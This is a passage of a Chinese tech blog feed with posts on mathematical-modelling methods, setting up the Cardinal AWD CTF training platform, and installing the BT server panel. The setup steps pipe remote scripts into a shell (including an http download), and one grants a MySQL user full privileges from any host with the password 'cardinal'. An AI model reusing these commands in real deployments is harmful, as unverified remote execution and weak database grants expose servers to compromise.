href="#实际应用中的典型任务" class="headerlink" title="实际应用中的典型任务"></a><strong>实际应用中的典型任务</strong></h3><ul><li><strong>数据清洗</strong>：使用 <strong>Pandas</strong> 处理缺失值、重复数据和异常值。</li><li><strong>数据分析</strong>：使用 <strong>Pandas</strong> 和 <strong>NumPy</strong> 对数据进行统计分析和特征工程。</li><li><strong>机器学习建模</strong>：使用 <strong>Scikit-Learn</strong> 进行回归、分类和聚类建模，进行数据拟合和预测。</li><li><strong>优化</strong>：使用 <strong>SciPy</strong> 优化函数进行模型参数调整、最优解求解等。</li><li><strong>数据可视化</strong>：使用 <strong>Matplotlib</strong> 绘制各种图形，帮助理解数据的分布和模型效果。</li></ul><h1 id="题型分类"><a href="#题型分类" class="headerlink" title="题型分类"></a>题型分类</h1><ul><li><h3 id="1-评价类模型"><a href="#1-评价类模型" class="headerlink" title="1. 评价类模型"></a><strong>1. 评价类模型</strong></h3><p>评价类模型用于综合分析和评估系统或方案的优劣，适用于多维度、多指标的决策问题。</p><h4 id="常见方法："><a href="#常见方法：" class="headerlink" title="常见方法："></a><strong>常见方法</strong>：</h4><ul><li><p><strong>主成分分析（PCA）</strong>：</p><ul><li><p><strong>应用实例</strong>：假设你有一个涉及多个维度的消费者满意度调查数据，包含产品质量、服务态度、性价比等多个指标。通过PCA，可以将这些多个维度的指标降到一个或几个主成分，从而简化数据，并保留最能反映差异的信息，帮助决策者更清晰地看到数据的趋势和结构。</p></li><li><p><strong>使用方法</strong>：你可以使用Python中的<code>sklearn.decomposition.PCA</code>来执行PCA，选择适当的主成分数目，完成降维并分析各主成分的方差贡献率。</p></li><li><p>PCA用于数据降维，常用于减少特征数量，同时保留数据的主要信息。</p></li><li><p><strong>示例：</strong></p><p>假设你有一个关于多个属性（如年龄、收入、教育程度等）的顾客数据，你想通过PCA来简化数据，便于后续分析。</p></li></ul><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-title">from</span> sklearn.decomposition <span class="hljs-keyword">import</span> PCA<br><span class="hljs-title">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> StandardScaler<br><br><span class="hljs-meta"># 示例数据（假设有4个特征）</span><br><span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-type">Age</span>&#x27;: [25, 30, 35, 40, 45],</span><br><span class="hljs-class">        &#x27;<span class="hljs-type">Income</span>&#x27;: [50000, 60000, 70000, 80000, 90000],</span><br><span class="hljs-class">        &#x27;<span class="hljs-type">Education</span>&#x27;: [2, 3, 2, 3, 4],</span><br><span class="hljs-class">        &#x27;<span class="hljs-type">Spending_Score</span>&#x27;: [70, 80, 90, 85, 75]&#125;</span><br><br><span class="hljs-title">df</span> = pd.<span class="hljs-type">DataFrame</span>(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br><br><span class="hljs-meta"># 标准化数据</span><br><span class="hljs-title">scaler</span> = <span class="hljs-type">StandardScaler</span>()<br><span class="hljs-title">scaled_data</span> = scaler.fit_transform(df)<br><br><span class="hljs-meta"># 使用PCA进行降维</span><br><span class="hljs-title">pca</span> = <span class="hljs-type">PCA</span>(n_components=<span class="hljs-number">2</span>)  # 降到<span class="hljs-number">2</span>个主成分<br><span class="hljs-title">principal_components</span> = pca.fit_transform(scaled_data)<br><br><span class="hljs-meta"># 创建新的DataFrame保存主成分</span><br><span class="hljs-title">pc_df</span> = pd.<span class="hljs-type">DataFrame</span>(<span class="hljs-class"><span class="hljs-keyword">data</span>=principal_components, columns=[&#x27;<span class="hljs-type">PC1&#x27;</span>, &#x27;<span class="hljs-type">PC2&#x27;</span>])</span><br><br><span class="hljs-title">print</span>(pc_df)<br><br></code></pre></td></tr></table></figure></li><li><p><strong>层次分析法（AHP）</strong>：</p><ul><li><strong>应用实例</strong>：在选择供应商时，可能会考虑价格、质量、交货期等多个指标。通过AHP方法，可以建立这些因素的层次结构，进行定量比较并综合评估各供应商的综合得分。</li><li><strong>使用方法</strong>：通过构建判断矩阵，计算权重和一致性，最终得到各选项的优先级。</li></ul></li><li><p><strong>模糊综合评价法</strong>：</p><ul><li><strong>应用实例</strong>：在对项目风险进行评估时，可能存在许多模糊的信息，例如评估人员对某一风险的判断不确定。模糊综合评价法通过模糊逻辑将这些不确定性转换为数值，从而帮助决策者做出更合理的选择。</li><li><strong>使用方法</strong>：你可以使用模糊数学工具包（如<code>scikit-fuzzy</code>）来实现模糊规则并进行综合评价。</li></ul></li></ul><hr><h3 id="2-运筹优化类"><a href="#2-运筹优化类" class="headerlink" title="2. 运筹优化类"></a><strong>2. 运筹优化类</strong></h3><p>运筹优化模型用于处理如何在给定约束下优化目标（如最小化成本、最大化效益）的各种问题，广泛应用于生产调度、路径规划等领域。</p><h4 id="常见方法：-1"><a href="#常见方法：-1" class="headerlink" title="常见方法："></a><strong>常见方法</strong>：</h4><ul><li><strong>目标规划模型（Goal Programming）</strong>：<ul><li><strong>应用实例</strong>：假设一个企业在生产过程中有多个目标，如降低成本、提高生产效率等，但这些目标之间存在冲突。目标规划可以通过将多个目标转化为可比的优先级来帮助找到最佳的折衷解。</li><li><strong>使用方法</strong>：在Python中，可以通过<code>scipy.optimize.linprog</code>来求解目标规划问题，并根据不同目标的优先级设定相应的权重。</li></ul></li><li><strong>差分法</strong>：<ul><li><strong>应用实例</strong>：在优化生产线配置时，如果你需要分析生产速率随时间的变化，可以用差分法来求解动态系统的离散化优化问题。</li><li><strong>使用方法</strong>：通过离散化微分方程，并应用差分法求解离散状态下的最优解。</li></ul></li><li><strong>多目标优化（Multi-objective Optimization）</strong>：<ul><li><strong>应用实例</strong>：在电力系统的调度问题中，可能既要考虑最大化发电效益，又要考虑减少污染排放。这时可以通过多目标优化模型来寻找满足多个目标的最优调度方案。</li><li><strong>使用方法</strong>：使用遗传算法、粒子群优化等群体智能算法，找到多个目标之间的Pareto最优解。</li></ul></li></ul><hr><h3 id="3-预测类模型"><a href="#3-预测类模型" class="headerlink" title="3. 预测类模型"></a><strong>3. 预测类模型</strong></h3><p>预测类模型用于基于历史数据预测未来趋势，广泛应用于经济、金融、市场需求等领域。</p><h4 id="常见方法：-2"><a href="#常见方法：-2" class="headerlink" title="常见方法："></a><strong>常见方法</strong>：</h4><ul><li><strong>时间序列分析（AR模型）</strong>：<ul><li><strong>应用实例</strong>：假设你正在分析某产品的月销售数据，通过AR模型可以基于历史销售数据预测未来几个月的销售趋势。</li><li><strong>使用方法</strong>：可以通过<code>statsmodels.tsa.ar_model.AutoReg</code>进行AR模型的拟合和预测。</li></ul></li><li><strong>蒙特卡洛模型</strong>：<ul><li><strong>应用实例</strong>：在股票市场中，蒙特卡洛模拟常用于估计资产的未来价格分布，特别是在不确定性较高的情形下（如期权定价）。</li><li><strong>使用方法</strong>：通过Python的<code>numpy.random</code>库生成大量随机样本，进行多次模拟，从而获得不同情景下的预期结果。</li></ul></li><li><strong>回归分析（如逻辑回归、支持向量机等）</strong>：<ul><li><strong>应用实例</strong>：在金融领域，你可能想通过历史数据来预测某项股票是否会上涨。这时可以使用逻辑回归来预测股价上涨的概率。</li><li><strong>使用方法</strong>：使用<code>sklearn.linear_model.LogisticRegression</code>或<code>sklearn.svm.SVC</code>来拟合训练数据，进行预测。</li></ul></li></ul><hr><h3 id="4-机理分析类"><a href="#4-机理分析类" class="headerlink" title="4. 机理分析类"></a><strong>4. 机理分析类</strong></h3><p>机理分析类模型通过建立系统内部的机制来解释和预测系统行为，通常用于物理学、工程学等复杂领域。</p><h4 id="常见方法：-3"><a href="#常见方法：-3" class="headerlink" title="常见方法："></a><strong>常见方法</strong>：</h4><ul><li><strong>群智能算法</strong>：<ul><li><strong>应用实例</strong>：在一个大规模生产调度问题中，使用粒子群优化（PSO）可以有效地找到最优的生产顺序和资源分配方案，尤其是在面对大量复杂约束时。</li><li><strong>使用方法</strong>：Python的<code>pyswarm</code>库可以帮助实现粒子群优化算法。</li></ul></li><li><strong>分类算法（如SVM、随机森林、KNN）</strong>：<ul><li><strong>应用实例</strong>：在客户细分问题中，可以使用随机森林算法来根据客户的历史购买行为进行分类，从而为不同类别的客户设计不同的营销策略。</li><li><strong>使用方法</strong>：使用<code>sklearn.ensemble.RandomForestClassifier</code>来进行模型训练，使用<code>sklearn.metrics</code>评估分类效果。</li></ul></li><li><strong>聚类算法（如K-Means、层次聚类）</strong>：<ul><li><strong>应用实例</strong>：在市场调研中，可以使用K-Means算法对顾客群体进行聚类分析，从而帮助公司了解不同消费者的需求和偏好。</li><li><strong>使用方法</strong>：通过<code>sklearn.cluster.KMeans</code>实现K-Means聚类，使用<code>matplotlib</code>进行结果可视化。</li></ul></li></ul><hr><h3 id="5-其他常用算法"><a href="#5-其他常用算法" class="headerlink" title="5. 其他常用算法"></a><strong>5. 其他常用算法</strong></h3><ul><li><strong>粒子群优化（PSO）</strong>：适用于全局优化问题，如机器学习中的超参数调优。<ul><li><strong>应用实例</strong>：调优支持向量机（SVM）的核函数参数时，可以使用PSO算法找到最优的参数组合。</li><li><strong>使用方法</strong>：通过<code>pyswarm</code>库进行PSO优化。</li></ul></li><li><strong>遗传算法（GA）</strong>：广泛应用于路径规划、特征选择等优化问题。<ul><li><strong>应用实例</strong>：在路径规划问题中，GA可以用于找到一条从起点到终点的最短路径。</li><li><strong>使用方法</strong>：通过<code>deap</code>库实现遗传算法的迭代优化。</li></ul></li><li><strong>K-Means与层次聚类</strong>：用于无监督学习的聚类分析。<ul><li><strong>应用实例</strong>：在客户细分问题中，K-Means算法可以将不同购买行为的客户划分为不同的组。</li><li><strong>使用方法</strong>：使用<code>sklearn.cluster.KMeans</code>来实现聚类，<code>scipy.cluster.hierarchy</code>实现层次聚类。</li></ul></li></ul></li></ul><h3 id="总结分类"><a href="#总结分类" class="headerlink" title="总结分类"></a><strong>总结分类</strong></h3><table><thead><tr><th><strong>分类</strong></th><th><strong>模型&#x2F;方法</strong></th><th><strong>应用领域&#x2F;目的</strong></th></tr></thead><tbody><tr><td><strong>评价类模型</strong></td><td>主成分分析（PCA）、层次分析法（AHP）、模糊综合评价法</td><td>用于多维度、多指标评价，如决策支持、项目评估等。</td></tr><tr><td><strong>运筹优化类</strong></td><td>目标规划模型、目标优化、差分法、多目标优化</td><td>用于资源分配、路径规划、调度优化等问题。</td></tr><tr><td><strong>预测类模型</strong></td><td>时间序列分析（AR模型）、蒙特卡洛模拟、回归分析</td><td>用于趋势预测、风险评估、需求预测等。</td></tr><tr><td><strong>机理分析类</strong></td><td>群智能算法、分类算法（逻辑回归、SVM、随机森林、KNN）、聚类算法（K-Means、层次聚类）</td><td>用于数据分类、聚类、模式识别等，适用于监督学习和无监督学习。</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数学建模</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWD的搭建</title>
    <link href="/2024/09/23/AWD%E7%9A%84%E7%8E%AF%E5%A2%83/"/>
    <url>/2024/09/23/AWD%E7%9A%84%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<p>一、About Cardinal<br>Cardinal 由 Vidar-Team 团队开发，接受并允许各大高校、安全团队、技术爱好者使用 Cardinal 作为比赛训练平台或举办内部训练赛。 </p><p>环境要求： </p><p>（1）基础操作系统（ubuntu、centos、Windows 等）<br>（2）docker 环境（含 docker-compose）<br>（3）mysql 数据库<br>（4）python 环境</p><p>二、Cardinal 部署过程<br>1、ubuntu 和 centos 默认是没有 docker 和 mysql 的，因此在环境部署开始前需要安装 docker 和 mysql。<br>Docker 安装可以使用官方安装脚本自动安装： </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">curl -fsSL <span class="hljs-keyword">https</span>://<span class="hljs-built_in">get</span>.docker.com | bash -s docker <span class="hljs-comment">--mirror Aliyun</span><br></code></pre></td></tr></table></figure><p>mysql 安装： </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span><br>apt-<span class="hljs-keyword">get</span> install mysql-<span class="hljs-keyword">server</span> <br></code></pre></td></tr></table></figure><p>2、准备好基础环境之后，下载 Cardinal。<br>下载地址：<a href="https://github.com/vidar-team/Cardinal/releases%E8%BF%99%E9%87%8C%E9%80%89%E6%8B%A9">https://github.com/vidar-team/Cardinal/releases这里选择</a> linux_amd64 的包 </p><p><img src="/../img/image-20240923164317850.png" alt="image-20240923164317850"></p><p>下载下来后，通过 SSH 工具将包上传至虚拟机上。</p><p> 2、解压 .tar.gz  </p><p><img src="/../img/image-20240923164353903.png" alt="image-20240923164353903"></p><p>3、由于 mysql 的 root 用户默认为空密码，设置密码比较麻烦，而Cardinal 配置需要 mysql 密码，因此最简单的方式就是新建一个用户,即可。 </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;cardinal&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;cardinal&#x27;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span>; <br></code></pre></td></tr></table></figure><p>4、新建 cardinal 数据库。 </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> `cardinal` <span class="hljs-keyword">DEFAULT</span> <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci; <br></code></pre></td></tr></table></figure><p>![image-20240923164427731](F:\new myblog\STUDY\source\img\image-20240923164427731.png)</p><p>5、执行 .&#x2F;Cardinal</p><p>首次执行，由于没有配置文件，因此需要跟着向导进行配置，配置完成后，在 Cardinal 的同级目录下的 conf 文件夹下可以看到配置文件Cardinal.toml。 </p><p><img src="/../img/image-20240923164448841.png" alt="image-20240923164448841"></p><p><img src="/../img/image-20240923164457793.png" alt="image-20240923164457793"></p><p>6、按照引导配置成功 Cardinal 平台后，不要关闭 Cardinal 的进程！！！不然平台就直接退出了。<br>7、Cardinal 搭建成功后，平台地址如下： </p><p>管理端地址：<a href="http://ip:19999/manager">http://ip:19999/manager</a> 选手端地址：<a href="http://ip:19999/">http://ip:19999</a> </p><p>管理端登录的账号密码为刚才引导过程设置的账号密码，选手端账号密码需要在登录管理端之后进行设置。 </p><p><img src="/../img/image-20240923164521861.png" alt="image-20240923164521861"></p><p><img src="/../img/image-20240923164528676.png" alt="image-20240923164528676"></p><p>8、在访问平台的时候，我们在 shell 界面可以看到平台的部分日志信息。 </p><p><img src="/../img/image-20240923164539997.png" alt="image-20240923164539997"></p><p>9、至此，AWD Cardinal 平台就已经搭建完毕了。 </p><p>三、管理端配置<br>1、管理端配置流程<br>上载 awd 靶机(通常为 tar 包)至虚拟机并 load 为镜像 -&gt; 根据队伍数量手动创建对应数量的容器 -&gt; 队伍管理页面添加队伍 -&gt; 题目管理页面创建题目 -&gt; 靶机管理页面创建靶机绑定题目并分配给各队伍 -&gt; 在配置管理页面编辑比赛名和 flag 前缀 -&gt; Flag 管理页面生成 flag -&gt; 等待比赛开始。<br>说明：在命令行配置比赛开始时间时，尽量将比赛设置在至少15-25 分钟后，因为需要留出部分时间在 web 端做相关配置。<br>2、数据大屏 </p><p><img src="/../img/image-20240923164601525.png" alt="image-20240923164601525"></p><p>3、队伍管理<br>添加队伍，并上传队伍图片 logo，添加队伍后，会弹出队伍账号和密码，需保存。若忘记可通过管理端更改账号密码。 </p><p><img src="/../img/image-20240923164616693.png" alt="image-20240923164616693"></p><p><img src="/../img/image-20240923164623791.png" alt="image-20240923164623791"></p><p>4、题目管理<br>题目可自定义分数，并可以设置为自动更新 Flag，自动更新 flag默认方式是将 flag 写入根目录下的 flag 文件，当然，flag 存在的位置可以使用命令进行自定义。 </p><p><img src="/../img/image-20240923164640310.png" alt="image-20240923164640310"></p><p>5、靶机管理<br>添加靶机前，需要手动创建对应队伍数量的 docker 容器，这里以三个队伍为例。 </p><p><img src="/../img/image-20240923164656007.png" alt="image-20240923164656007"></p><p>创建靶机这里有一个需要注意的一个点是，Flag SSH 的用户必须为 root，否则，flag 是写入不到靶机里的。 </p><p><img src="/../img/image-20240923164718071.png" alt="image-20240923164718071"></p><p>设置完成 SSH 账号密码后，可以测试是否可以正常连接。 </p><p><img src="/../img/image-20240923164729286.png" alt="image-20240923164729286"></p><p>6、Flag 管理</p><p>完成题目和靶机创建后，需要生成 flag。 直接点击 Flag 管理页面的“生成 Flag”即可。</p><p><img src="/../img/image-20240923164744601.png" alt="image-20240923164744601"></p><p>7、配置管理<br>在管理端配置管理页面可以自定义比赛名称、Flag 前后缀等，也可设置队伍靶机是否相互可见。<br>若设置队伍靶机相互可见，则在选手端可以看到所有靶机列表内的所有靶机。<br>8、重建竞赛<br>因为该平台无法通过 web 页面进行创建比赛，所以只能通过执行 Cardinal 使用命令行进行创建。<br>非首次创建比赛，默认不会重新进行引导设置，因为 Cardinal 会去加载 conf 文件夹下的 Cardinal.toml 配置文件。<br>再次创建竞赛时，直接编辑 Cardinal.toml 文件，保存并执行即可。 </p><p><img src="/../img/image-20240923164758772.png" alt="image-20240923164758772"></p><p>关于 Cardinal.toml 配置文件，重建竞赛时，只需要关注比赛开始时间、结束时间、轮次刷新时间、攻击&#x2F;check 分数等项即可。<br>9、注意事项 </p><p>​需要注意的是，以上配置均需要在竞赛开始前完成。</p><p>四、选手端</p><p>​根据在管理端创建生成的队伍账号密码进行登录。</p><p><img src="/../img/image-20240923164833089.png" alt="image-20240923164833089"></p><p>选手端，可以看到竞赛靶机，提交 Flag，查看排名和公告等。 </p><p>五、Asteroid 3D 实时大屏配置<br>Asteroid 是使用 Unity3D 开发的一款 AWD 3D 实时大屏，后端已与 Cardinal 平台深度整合。 </p><p>Asteroid 下载地址：<a href="https://github.com/wuhan005/Asteroid/releases">https://github.com/wuhan005/Asteroid/releases</a></p><p><img src="/../img/image-20240923164903182.png" alt="image-20240923164903182"></p><p>1、下载后解压压缩包 </p><p><img src="/../img/image-20240923164915894.png" alt="image-20240923164915894"></p><p>2、编辑 .&#x2F;Asteroid_Data&#x2F; StreamingAssets&#x2F; 目录下的 asteroid.ini 文件。 </p><p>将 localhost 改为平台 ip 地址并保存，如下： </p><p><img src="/../img/image-20240923164940685.png" alt="image-20240923164940685"></p><p>3、回到 Asteroid_Data 文件夹同级目录，打开 Asteroid.exe。 </p><p>4、展示效果如下： </p><p><img src="/../img/image-20240923164954387.png" alt="image-20240923164954387"></p><p>六、靶机 check<br>1、关于 Cardinal 平台的 Check 功能<br>平台里并没有集成 Check 的功能，Check 和平台是分开的。<br>平台会为 Check 提供一个 Check 账号，用来请求题目接口进行扣分。 </p><p>账号管理 -&gt; 添加管理员账号 -&gt; 勾选“Check 账号”。 </p><p><img src="/../img/image-20240923165012778.png" alt="image-20240923165012778"></p><p>当 Check 检测到靶机服务器不可用时，Check 会使用管理员账号向平台接口发送请求，平台收到后将对应靶机状态设为 Down，并在本轮结束分数结算时扣分。</p><p>2、Check 示例脚本 </p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">import</span> requests <br><span class="hljs-comment"># Check 判断逻辑 </span><br><span class="hljs-comment"># 发送 CheckDown 信息到平台 </span><br>TOKEN = <span class="hljs-string">&#x27;CHECK_MANAGER_TOKEN_HERE&#x27;</span>  <span class="hljs-comment"># Check Token </span><br>GameBoxID = <span class="hljs-number">1</span> <br>resp = requests.post(<span class="hljs-string">&#x27;http://localhost:19999/api/manager/checkDown&#x27;</span>, <br> json=&#123;<span class="hljs-string">&#x27;GameBoxID&#x27;</span>: GameBoxID&#125;, <br>  headers=&#123;<span class="hljs-string">&#x27;Authorization&#x27;</span>: TOKEN&#125;).json() <br>  <br><span class="hljs-keyword">if</span> resp[<span class="hljs-string">&#x27;error&#x27;</span>] != <span class="hljs-number">0</span>:  <br> <span class="hljs-built_in">print</span>(resp[<span class="hljs-string">&#x27;msg&#x27;</span>]) <br></code></pre></td></tr></table></figure><p>3、如何实现自动 Check<br>由于 Cardinal 平台不能实现自动 Check 功能，因此若想实现自动 Check，需依赖第三方工具。这里推荐 Linux 下的 Crontab 定时任务工具来实现 Check 脚本的定时运行。 </p><p>Crontab 定时任务工具使用教程，请参见</p><p>七、靶机的批量创建与重置<br>1、靶机的批量创建<br>Cardinal AWD 平台并未集成关于靶机的创建和靶机的重置功能，因此，正常情况下，需要我们通过手动方式去创建靶机（docker 容器）。这种方式可行，但是如果队伍对较多或靶机数量多的时候，手动创建靶机是一件非常麻烦的事情，因此我们可以使用 shell 脚本去实现批量创建靶机的功能。<br>2、批量创建靶机 shell 脚本<br>执行脚本，根据提示输入需要创建靶机的 docker images、服务端口以及数量即可。 </p><p>脚本涉及参数可根据靶机情况自行修改使用。 </p><p><img src="/../img/image-20240923165240321.png" alt="image-20240923165240321"></p><p>3、重置靶机<br>与靶机的创建一样，Cardinal AWD 平台依然没有集成重置靶机的功能，所以我们还是使用 shell 脚本来实现该功能。<br>重置靶机的功能我们虽然可以使用 shell 脚本的方式来实现，但是，重置扣分的行为并无法实现，需要我们手动来进行统计。后续再对平台的研究过程中会逐步考虑该功能的加入。</p><p>4、重置靶机 shell 脚本<br>重置靶机的功能是依据队伍靶机的端口来进行寻找的，因为队伍对应靶机的端口是唯一的。<br>根据提示，输入队伍对应靶机的端口号，这里限制了需要同时输入 http 服务和 ssh 服务的端口来判断队伍的唯一性，如果输入的 http服务端口和 ssh 服务端口是不同靶机的，则会要求重新输入。</p><p><img src="/../img/image-20240923165305211.png" alt="image-20240923165305211"></p><p>脚本详见附件 reset_target.sh </p><p>八、靶机的隔离与全通<br>在 AWD 竞赛中，通常在比赛开始后的前半小时至一小时的时间是加固时间。在加固时间段内，每支队伍只能访问自己队伍的靶机，不能访问和攻击其他队伍的靶机。但是，这个功能该平台是无法实现的，因此我们利用 iptables 探索出了一个新的方案。<br>1、iptables 实现端口隔离<br>实验原理：配置 iptables 规则，来限制指定 ip（或 ip 段）访问指定端口。由于我们使用和访问的端口是容器映射到虚拟机上的端口，要实 现真正的端口隔离，我们就需要将 iptables 规则配置在 DOCKER-USER 链上，同时添加链接追踪模块，来负责解决 docker 容器内部 ip和端口与虚拟机 ip 和端口不匹配的问题。<br>Demo： </p><p><img src="/../img/image-20240923165354383.png" alt="image-20240923165354383"></p><p>解释：<br>限制 192.168.63.180 只能访问该靶机的 8801 端口，其他同理。最后一条限制其他 ip 访问。其中，ens33 为虚拟机网卡。<br>当队伍数量（含 ip 数量）交多的时候，我们如果手动来去创建iptables 规则，会相当的麻烦，因此，我们还是使用批量 shell 脚本来实现该功能。<br>批量创建 iptables 规则实现隔离的批量脚本详见附件：create_iptbs.sh<br>2、iptables 实现所有队伍（选手）与所有靶机全通<br>当加固时间结束后，需要保证以下两点：第一，所有队伍的所有选手与所有靶机是可以通信的；第二，除了参赛队伍 ip 以外的所有ip 进制访问竞赛靶机。<br>实现所有选手与所有靶机全通的难度要比实现隔离的难度要低一些，规则跟实现隔离的规则差不多，demo 如下： </p><p><img src="/../img/image-20240923165409303.png" alt="image-20240923165409303"></p><p>脚本的原理：添加规则允许所有参赛选手访问所有靶机的所有端口。 </p><p>脚本详见附件：del_iptbs.sh </p><p>九、其他<br>1、关于比赛时间的设置<br>创建竞赛前，需确认平台宿主机时间是否为东八区时间，以免竞赛时间设置错误。 </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">date</span> -R    <span class="hljs-comment">#查看当前时区 </span><br></code></pre></td></tr></table></figure><p>若时区不符合东八区时间，请参见解决方案：Linux 下修改时区为东八区2、一定要留出足够的时间来配置题目，尽量提前创建竞赛，或尽量将比赛设置在 15-25 分钟后的时间作为开始时间，留出足够的时间来进行队伍、题目、靶机等功能的配置。<br>3、建议 Cardinal 使用 mysql 的非 root 用户，并设置好复杂密码。 4、关于 AWD 靶机 Check 问题，靶机的 Check 脚本需要根据不同的靶机来定制编写，编写时按照上述平台对于 Check 接口的定义来编写，可将 Check 结果上传至平台进行数据的处理。</p>]]></content>
    
    
    <categories>
      
      <category>CTF AWD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>服务器部署</title>
    <link href="/2024/09/12/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2/"/>
    <url>/2024/09/12/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<p>你提供的步骤描述了如何在 Linux 系统上安装 <strong>宝塔面板 7.3</strong> 版本并进行初步配置。这是一个详细的指南，适用于 CentOS、Ubuntu、Debian、Fedora 等 Linux 发行版，安装步骤如下：</p><h3 id="安装宝塔面板步骤："><a href="#安装宝塔面板步骤：" class="headerlink" title="安装宝塔面板步骤："></a><strong>安装宝塔面板步骤：</strong></h3><h4 id="1-登录服务器"><a href="#1-登录服务器" class="headerlink" title="1. 登录服务器"></a>1. <strong>登录服务器</strong></h4><p>使用 SSH 连接到你的阿里云服务器（或者其他云服务器），确保你使用的是具有 <strong>sudo 权限</strong> 的用户账号。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh root@你的服务器IP地址<br></code></pre></td></tr></table></figure><h4 id="2-安装宝塔面板"><a href="#2-安装宝塔面板" class="headerlink" title="2. 安装宝塔面板"></a>2. <strong>安装宝塔面板</strong></h4><p>根据你使用的操作系统，执行相应的安装命令：</p><ul><li><p><strong>CentOS&#x2F;Alibaba Cloud Linux</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh<br></code></pre></td></tr></table></figure></li><li><p><strong>Ubuntu&#x2F;Deepin</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; <span class="hljs-built_in">sudo</span> bash install.sh<br></code></pre></td></tr></table></figure></li><li><p><strong>Debian</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh<br></code></pre></td></tr></table></figure></li><li><p><strong>Fedora</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh<br></code></pre></td></tr></table></figure></li></ul><h4 id="3-确认安装"><a href="#3-确认安装" class="headerlink" title="3. 确认安装"></a>3. <strong>确认安装</strong></h4><p>安装过程会提示你输入 <code>y</code> 确认安装，按照提示操作即可。</p><h4 id="4-获取登录信息"><a href="#4-获取登录信息" class="headerlink" title="4. 获取登录信息"></a>4. <strong>获取登录信息</strong></h4><p>安装完成后，系统会生成并显示面板登录信息，包括：</p><ul><li><strong>外网面板地址</strong>：用于外网访问宝塔面板的 URL。</li><li><strong>内网面板地址</strong>：用于内网访问宝塔面板的 URL。</li><li><strong>默认账号（username）</strong>：随机生成的 8 位字母和数字组合。</li><li><strong>默认密码（password）</strong>：随机生成的 8 位字母和数字组合。</li></ul><p><strong>重要提示</strong>：一定要保存好这些信息，因为你需要它们来登录宝塔面板。</p><h4 id="5-开放8888端口"><a href="#5-开放8888端口" class="headerlink" title="5. 开放8888端口"></a>5. <strong>开放8888端口</strong></h4><p>宝塔面板默认使用 <code>8888</code> 端口（如果安装过程中端口有变动，请根据提示使用新的端口）。你需要在阿里云控制台的 <strong>安全组规则</strong> 中开放该端口：</p><ul><li>登录阿里云控制台，进入 <strong>ECS 实例</strong>。</li><li>点击左侧的 <strong>网络和安全 &gt; 